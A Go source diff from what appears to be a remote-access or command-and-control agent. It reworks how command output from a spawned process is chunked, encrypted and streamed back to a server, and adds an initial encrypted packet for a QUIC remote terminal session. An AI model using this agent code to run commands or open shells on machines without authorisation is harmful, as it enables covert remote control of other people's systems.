@@ -903,47 +903,59 @@ func jobRun(paramsData []byte) ([]byte, error) {
 					return
 
 				case <-ticker.C:
-					ansRun := utils.AnsRun{Pid: pid}
+					// Drain Stdout
 					stdoutMu.Lock()
-					out := stdoutBuf.String()
+					outStr := stdoutBuf.String()
+					stdoutBuf.Reset()
 					stdoutMu.Unlock()
-					if len(out) > lastOutLen {
-						chunk := out[lastOutLen:]
-						if len(chunk) > maxChunkSize {
-							ansRun.Stdout = chunk[:maxChunkSize]
-							lastOutLen += maxChunkSize
-						} else {
-							ansRun.Stdout = chunk
-							lastOutLen = len(out)
-						}
-					}
 
+					// Drain Stderr
 					stderrMu.Lock()
-					errOut := stderrBuf.String()
+					errStr := stderrBuf.String()
+					stderrBuf.Reset()
 					stderrMu.Unlock()
-					if len(errOut) > lastErrLen {
-						chunk := errOut[lastErrLen:]
-						if len(chunk) > maxChunkSize {
-							ansRun.Stderr = chunk[:maxChunkSize]
-							lastErrLen += maxChunkSize
-						} else {
-							ansRun.Stderr = chunk
-							lastErrLen = len(errOut)
+					
+					// Send Stdout in chunks
+					for len(outStr) > 0 {
+						chunkSize := maxChunkSize
+						if len(outStr) < chunkSize {
+							chunkSize = len(outStr)
 						}
-					}
-
-					if len(ansRun.Stdout) > 0 || len(ansRun.Stderr) > 0 {
+						
+						ansRun := utils.AnsRun{Pid: pid, Stdout: outStr[:chunkSize]}
+						outStr = outStr[chunkSize:]
+						
 						job.Data, _ = msgpack.Marshal(ansRun)
 						packedJob, _ := msgpack.Marshal(job)
-
-						message := utils.Message{
-							Type:   2,
-							Object: [][]byte{packedJob},
-						}
-
+						message := utils.Message{Type: 2, Object: [][]byte{packedJob}}
 						sendData, _ := msgpack.Marshal(message)
 						sendData, _ = utils.EncryptData(sendData, utils.SKey)
-						functions.SendMsg(conn, sendData)
+						if err := functions.SendMsg(conn, sendData); err != nil {
+							return
+						}
+						// Small sleep to prevent flooding
+						time.Sleep(10 * time.Millisecond)
+					}
+
+					// Send Stderr in chunks
+					for len(errStr) > 0 {
+						chunkSize := maxChunkSize
+						if len(errStr) < chunkSize {
+							chunkSize = len(errStr)
+						}
+						
+						ansRun := utils.AnsRun{Pid: pid, Stderr: errStr[:chunkSize]}
+						errStr = errStr[chunkSize:]
+						
+						job.Data, _ = msgpack.Marshal(ansRun)
+						packedJob, _ := msgpack.Marshal(job)
+						message := utils.Message{Type: 2, Object: [][]byte{packedJob}}
+						sendData, _ = msgpack.Marshal(message)
+						sendData, _ = utils.EncryptData(sendData, utils.SKey)
+						if err := functions.SendMsg(conn, sendData); err != nil {
+							return
+						}
+						time.Sleep(10 * time.Millisecond)
 					}
 				}
 			}
@@ -954,60 +966,51 @@ func jobRun(paramsData []byte) ([]byte, error) {
 		wg.Wait()
 		close(done)
 
+		// Final drain
 		stdoutMu.Lock()
 		finalOut := stdoutBuf.String()
+		stdoutBuf.Reset()
 		stdoutMu.Unlock()
+		
 		stderrMu.Lock()
 		finalErrOut := stderrBuf.String()
+		stderrBuf.Reset()
 		stderrMu.Unlock()
 
-		for {
-			ansRun := utils.AnsRun{Pid: pid}
-			hasMore := false
-
-			if len(finalOut) > lastOutLen {
-				chunk := finalOut[lastOutLen:]
-				if len(chunk) > maxChunkSize {
-					ansRun.Stdout = chunk[:maxChunkSize]
-					lastOutLen += maxChunkSize
-					hasMore = true
-				} else {
-					ansRun.Stdout = chunk
-					lastOutLen = len(finalOut)
-				}
+		// Send final Stdout
+		for len(finalOut) > 0 {
+			chunkSize := maxChunkSize
+			if len(finalOut) < chunkSize {
+				chunkSize = len(finalOut)
 			}
+			ansRun := utils.AnsRun{Pid: pid, Stdout: finalOut[:chunkSize]}
+			finalOut = finalOut[chunkSize:]
+			
+			job.Data, _ = msgpack.Marshal(ansRun)
+			packedJob, _ = msgpack.Marshal(job)
+			message = utils.Message{Type: 2, Object: [][]byte{packedJob}}
+			sendData, _ = msgpack.Marshal(message)
+			sendData, _ = utils.EncryptData(sendData, utils.SKey)
+			functions.SendMsg(conn, sendData)
+			time.Sleep(10 * time.Millisecond)
+		}
 
-			if len(finalErrOut) > lastErrLen {
-				chunk := finalErrOut[lastErrLen:]
-				if len(chunk) > maxChunkSize {
-					ansRun.Stderr = chunk[:maxChunkSize]
-					lastErrLen += maxChunkSize
-					hasMore = true
-				} else {
-					ansRun.Stderr = chunk
-					lastErrLen = len(finalErrOut)
-				}
+		// Send final Stderr
+		for len(finalErrOut) > 0 {
+			chunkSize := maxChunkSize
+			if len(finalErrOut) < chunkSize {
+				chunkSize = len(finalErrOut)
 			}
-
-			if len(ansRun.Stdout) > 0 || len(ansRun.Stderr) > 0 {
-				job.Data, _ = msgpack.Marshal(ansRun)
-				packedJob, _ = msgpack.Marshal(job)
-				message = utils.Message{
-					Type:   2,
-					Object: [][]byte{packedJob},
-				}
-				sendData, _ = msgpack.Marshal(message)
-				sendData, _ = utils.EncryptData(sendData, utils.SKey)
-				functions.SendMsg(conn, sendData)
-
-				if hasMore {
-					time.Sleep(100 * time.Millisecond)
-				}
-			}
-
-			if !hasMore {
-				break
-			}
+			ansRun := utils.AnsRun{Pid: pid, Stderr: finalErrOut[:chunkSize]}
+			finalErrOut = finalErrOut[chunkSize:]
+			
+			job.Data, _ = msgpack.Marshal(ansRun)
+			packedJob, _ = msgpack.Marshal(job)
+			message = utils.Message{Type: 2, Object: [][]byte{packedJob}}
+			sendData, _ = msgpack.Marshal(message)
+			sendData, _ = utils.EncryptData(sendData, utils.SKey)
+			functions.SendMsg(conn, sendData)
+			time.Sleep(10 * time.Millisecond)
 		}
 
 		/// FINISH
@@ -1374,7 +1377,16 @@ func jobTerminal(paramsData []byte) {
 			defer wg.Done()
 			if profile.Protocol == "quic" {
 				// Framed Writer for QUIC: Pty -> Conn
-				buf := make([]byte, 4096)
+				buf := make([]byte, 8192)
+
+				// Send initial empty packet to kickstart connection (fix Waiting status)
+				initTermPack := utils.TermPack{Id: uint(AgentId), TermId: params.TermId, Key: tunKey, Iv: tunIv, Alive: true, Data: nil}
+				initTpData, _ := msgpack.Marshal(initTermPack)
+				initStartMsg := utils.StartMsg{Type: utils.JOB_TERMINAL, Data: initTpData}
+				initSmData, _ := msgpack.Marshal(initStartMsg)
+				initFinalData, _ := utils.EncryptData(initSmData, encKey)
+				_ = functions.SendMsg(srvConn, initFinalData)
+
 				for {
 					var n int
 					if rw, ok := ptyProc.(io.ReadWriter); ok {
